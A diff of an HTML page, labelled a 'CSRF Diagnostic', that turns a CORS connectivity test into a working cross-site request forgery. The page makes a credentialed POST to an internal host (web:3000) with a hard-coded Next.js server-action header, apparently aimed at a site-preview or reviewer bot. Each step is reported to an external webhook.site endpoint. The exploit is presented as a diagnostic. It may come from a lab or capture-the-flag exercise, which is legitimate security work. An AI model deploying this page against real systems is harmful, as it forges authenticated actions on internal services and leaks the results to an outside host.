@@ -1,79 +1,63 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>SitePreview Reviewer Test v3</title>
+<meta charset="UTF-8">
+<title>SitePreview CSRF Diagnostic</title>
 </head>
 <body>
-  <h1>SitePreview Reviewer Test v3</h1>
-  <p>Browser connectivity and CORS diagnostic</p>
-  <pre id="results">Starting tests...</pre>
+<h1>SitePreview CSRF Diagnostic v4</h1>
+<pre id="log"></pre>
 
-  <script>
-    const webhook =
-      "https://webhook.site/b8808c81-3dc6-4355-b282-f10b6d73f792";
+<script>
+const webhook =
+  "https://webhook.site/b8808c81-3dc6-4355-b282-f10b6d73f792";
 
-    const results = document.getElementById("results");
+const target = "http://web:3000/";
+const action =
+  "4045eb0bfd07ccd890b7aae2ed8bafbf7036d71abc";
 
-    function report(event, value) {
-      const data = {
-        event: event,
-        value: String(value),
-        time: new Date().toISOString()
-      };
+function report(event, value) {
+  document.getElementById("log").textContent +=
+    event + ": " + value + "\n";
 
-      const params = new URLSearchParams(data);
-      const url = webhook + "?" + params.toString();
+  const params = new URLSearchParams({
+    event,
+    value: String(value),
+    time: new Date().toISOString()
+  });
 
-      const line = event + ": " + value;
-      console.log("[TEST]", line);
-      results.textContent += "\n" + line;
+  fetch(webhook + "?" + params.toString(), {
+    mode: "no-cors",
+    credentials: "omit",
+    keepalive: true
+  }).catch(() => {});
+}
 
-      // Send the diagnostic to Webhook.site.
-      fetch(url, {
-        method: "GET",
-        mode: "no-cors",
-        credentials: "omit",
-        keepalive: true
-      }).catch(error => {
-        console.error("Webhook reporting failed:", error);
-      });
-    }
+async function run() {
+  report("started", location.origin);
 
-    async function testCors(name, credentials) {
-      try {
-        const response = await fetch(
-          "http://web:3000/robots.txt",
-          {
-            method: "GET",
-            mode: "cors",
-            credentials: credentials,
-            cache: "no-store",
-            signal: AbortSignal.timeout(8000)
-          }
-        );
+  try {
+    const response = await fetch(target, {
+      method: "POST",
+      mode: "no-cors",
+      credentials: "include",
+      headers: {
+        "Content-Type": "text/plain;charset=UTF-8",
+        "Next-Action": action
+      },
+      body: JSON.stringify(["https://example.com/"]),
+      signal: AbortSignal.timeout(8000)
+    });
 
-        report(name, "status:" + response.status);
-      } catch (error) {
-        report(name, "error:" + error.name);
-      }
-    }
+    report("action-fetch", response.type);
+  } catch (error) {
+    report("action-error", error.name);
+  }
 
-    async function main() {
-      report("started", location.origin);
+  report("completed", "yes");
+}
 
-      report("user-agent", navigator.userAgent);
-
-      await Promise.allSettled([
-        testCors("cors-omit", "omit"),
-        testCors("cors-include", "include")
-      ]);
-
-      report("tests-completed", "yes");
-    }
-
-    main();
-  </script>
+run();
+</script>
 </body>
 </html>
